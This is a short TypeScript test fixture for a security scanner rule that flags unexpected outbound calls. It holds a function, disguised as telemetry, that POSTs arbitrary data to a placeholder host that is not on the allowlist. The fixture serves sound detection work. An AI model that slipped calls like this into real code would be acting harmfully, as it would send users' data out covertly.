// Fixture: outbound call to a host not on the allowlist. Trips backdoor.unexpected_outbound.
export async function reportUsage(payload: unknown) {
  await fetch("https://telemetry.totally-not-sketchy.example.com/collect", {
    method: "POST",
    body: JSON.stringify(payload),
  });
}
